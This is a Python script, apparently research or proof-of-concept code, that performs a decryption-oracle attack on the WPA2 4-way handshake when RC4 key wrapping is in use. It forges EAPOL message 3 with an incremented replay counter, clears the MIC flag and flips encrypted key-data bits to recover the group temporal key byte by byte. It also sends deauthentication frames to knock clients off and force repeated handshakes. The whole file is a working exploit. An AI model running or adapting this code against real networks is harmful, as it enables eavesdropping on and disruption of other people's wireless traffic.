#!/usr/bin/env python
from scapy.all import *
from libwifi import *
import struct

STATE_UNDEFINED, STATE_NEW_HANDSHAKE, STATE_INJECTED_GUESS, STATE_WAIT_ANSWER = range(4)

class DecryptionOracle():
	def __init__(self, interface):
		self.iface = interface
		self.sock_mon = None
		self.state = STATE_UNDEFINED
		self.guess_pos = 31
		self.guess_value = None
		self.recovered_gtk = []

	def process_msg3(self, p):
		# =============== Construct a forged message 3 that is accepted iff. we guess a byte correctly ===============

		# Verify that RC4 is being used
		keydesc = get_eapol_keydesc(p)
		if keydesc != 1:
			print keydesc
			raise Exception("Handshake is not using RC4 encryption")

		# 1. Increase replay counter
		replaynum = get_eapol_replaynum(p)
		set_eapol_replaynum(p, replaynum + 1)

		# 2. Unset the MIC flag to skip authenticity verification
		flip_eapol_keyflag(p, EAPOL_KEYFLAG_MIC)


		# =============== Decryption oracle: flip bits in the key data field ===============

		# Key Data Cryptographic Encapsulations (KDEs) format:
		# - Type	1 byte		0xdd
		# - Length	1 byte
		# - OUI		3 bytes		00:0f:ac (for WPA2)
		# - Data Type	1 byte		0x01 (GTK KDE)
		# - 		1 byte		KeyID[bits 0-1], Tx [bit 2], Reserved [bits 3-7]
		# -		1 byte		Reserved [bits 0-7]
		# - GTK

		# 1. Guess structure of key data field based on its length
		key_data = list(p[EAPOL].load[95:])
		gtk_pos = None
		wpa_pos = None
		rsn_pos = None

		if len(key_data) in [94, 96]:
			rsn_pos = 0
			wpa_pos = 26
			gtk_pos = 54
		elif len(key_data) == 70:
			rsn_pos = 0
			gtk_pos = 24
		elif len(key_data) == 28:
			gtk_pos = None
		else:
			raise Exception("Can't handle key_data length %s" % len(key_data))

		# 2. Guess the next value
		if self.guess_value is None:
			self.guess_value = 0
		else:
			self.guess_value = (self.guess_value + 1) % 256

		# 3. Shrink the key data field such that the last byte is the unknown one to guess
		key_data = key_data[:gtk_pos + 8 + self.guess_pos + 1]

		# 4. We reduce the length of the shrunked GTK element by two bytes
		remaining_length = len(key_data[gtk_pos:]) - 4
		key_data[gtk_pos + 1] = chr( ord(key_data[gtk_pos + 1]) ^ 0x26 ^ remaining_length )

		# 5. We do not modify the second last byte. It now represents a random IE that hopefully is not equal to WLAN_EID_VENDOR_SPECIFIC
		#key_data[gtk_pos + 8 + self.guess_pos - 1]

		# 6. The length of this random IE must be zero: only then is message 3 accepted and will the AP reply with message 4.
		#    So we keep trying values for this byte until we get a message 4 as answer.
		key_data[gtk_pos + 8 + self.guess_pos] = chr( ord(key_data[gtk_pos + 8 + self.guess_pos]) ^ self.guess_value ^ 0x00 )


		# =============== Inject the constructed packet ===============

		print "Guessing position", self.guess_pos, "value", hex(self.guess_value)

		key_data = "".join(key_data)
		p[EAPOL].load = p[EAPOL].load[:95] + key_data

		set_eapol_key_data_len(p, len(key_data))
		p[EAPOL].len = len(p[EAPOL]) - 4

		self.sock_mon.send(p)

	def correct_guess(self, p):
		self.recovered_gtk.insert(0, self.guess_value)

		print "Recovered value", self.guess_value, "at position", self.guess_pos, "==> GTK so far =", self.recovered_gtk

		if len(self.recovered_gtk) == 32:
			quit(1)

		self.guess_pos -= 1
		self.guess_value = None

	def process_frame(self, p):
		eapol_num = get_eapol_msgnum(p)

		if eapol_num == 1:
			self.state = STATE_NEW_HANDSHAKE
		elif eapol_num == 3:
			if self.state == STATE_NEW_HANDSHAKE:
				self.process_msg3(p)
				self.state = STATE_INJECTED_GUESS
		elif eapol_num == 4:
			if self.state == STATE_INJECTED_GUESS:
				self.state = STATE_WAIT_ANSWER
		elif Dot11WEP in p and len(p[Dot11WEP]) in [149, 127]:
			if len(p[Dot11WEP]) == 149:
				# Against wpa_supp 2.6 we forge Msg1 and get back Msg2
				print "Detected encrypted message 2/4"
			else:
				# Against development version we forge Msg3
				print "Detected encrypted message 4/4"

			if self.state == STATE_WAIT_ANSWER:
				self.correct_guess(p)

			# Lazy method to continue guessing: deauth the client
			apmac = p.addr1
			stamac = p.addr2
			self.sock_mon.send(Dot11(FCfield="from-DS", addr1=stamac, addr2=apmac, addr3=apmac)/Dot11Deauth())

	def run(self):
		self.sock_mon = MitmSocket(type=ETH_P_ALL, iface=self.iface)
		while True:
			sel = select([self.sock_mon], [], [])
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if not p is None:
					self.process_frame(p)

if __name__ == "__main__":
	oracle = DecryptionOracle("wlan2")
	oracle.run()


